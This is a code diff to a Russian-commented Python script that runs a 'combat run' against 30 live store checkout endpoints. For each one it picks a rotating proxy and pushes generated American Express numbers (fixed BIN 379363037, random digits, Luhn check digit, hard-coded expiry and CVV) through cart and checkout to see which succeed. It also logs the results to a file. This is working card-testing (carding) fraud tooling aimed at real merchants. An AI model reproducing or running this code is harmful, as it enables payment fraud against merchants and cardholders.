@@ -2,6 +2,7 @@
 # Боевой прогон 06.09.2026: 30 целей Store API из живой ротации, probe-карта на каждую.
 # Штатный путь бота: pick_proxy из пула, check_target (cart -> add-item -> pm -> ctoken -> checkout).
 import asyncio
+import random
 import sys
 import time
 from pathlib import Path
@@ -16,16 +17,24 @@ N_TARGETS = 30
 PAUSE_S = 1.2
 
 
+def gen_amex(prefix="379363037"):
+    rand = "".join(str(random.randint(0, 9)) for _ in range(5))
+    partial = prefix + rand
+    check = gc.luhn_check_digit(partial)
+    return partial + str(check)
+
+
 async def main():
     targets = bg_store._targets()[:N_TARGETS]
     print(f"[*] живая ротация: {len(bg_store._targets())} целей, берём {len(targets)}", flush=True)
+    print(f"[*] тестирование карт с BIN 379363037 (American Express SafeKey)", flush=True)
     proxy_pool = gc.load_proxies()
     results = []
     t0 = time.time()
     for i, t in enumerate(targets, 1):
         proxy = gc.pick_proxy(proxy_pool, None)
-        probe = gc.gen_probe_card()
-        raw = f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"
+        pan = gen_amex()
+        raw = f"{pan}|11|28|4123"
         t1 = time.time()
         try:
             res = await store_gate.check_target(t, raw, proxy, 2000)
@@ -37,7 +46,12 @@ async def main():
         cur = res.get("currency") or ""
         det = str(res.get("detail", ""))[:110].replace(chr(10), " ")
         print(f"[{i:02}/{len(targets)}] {st:14} {t:42} {amt:>6}{cur:4} {lat:>6}ms | {det}", flush=True)
-        results.append({"target": t, "status": st, "amount": amt, "lat": lat, "detail": det})
+        results.append({"target": t, "status": st, "amount": amt, "lat": lat, "detail": det, "pan": gc.mask_pan(pan)})
+        import json as _json
+        import os as _os
+        _os.makedirs("data/results", exist_ok=True)
+        with open("data/results/_battle30_amex.jsonl", "a", encoding="utf-8") as _f:
+            _f.write(_json.dumps(results[-1], ensure_ascii=False) + "\n")
         if i < len(targets):
             await asyncio.sleep(PAUSE_S)
 
